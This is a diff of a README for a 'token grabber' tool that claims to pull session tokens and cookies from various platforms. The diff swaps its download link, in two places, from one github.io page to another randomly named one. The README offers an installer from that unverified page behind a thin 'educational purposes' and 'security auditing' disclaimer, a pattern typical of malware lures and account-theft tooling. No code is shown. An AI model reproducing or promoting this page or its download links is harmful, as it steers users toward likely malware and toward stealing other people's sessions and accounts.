@@ -2,7 +2,7 @@
 
 TokenMaster Pro Token Grabber is a sophisticated utility designed for the extraction and management of session tokens and cookies from various platforms. This 2026 edition brings enhanced stability and broader compatibility, making it a top choice for users requiring a reliable token grabber tool for security auditing and personal data recovery.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://yellowtaxisave.github.io/download-page/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://capitals-707-bringing.github.io/download-page/)
 
 ## What is TokenMaster Pro?
 
@@ -71,7 +71,7 @@ This tool is intended for educational purposes and authorized security testing o
 
 ## Download
 
-[Download the latest version from GitHub](https://yellowtaxisave.github.io/download-page/)
+[Download the latest version from GitHub](https://capitals-707-bringing.github.io/download-page/)
 
 ## Changelog
 
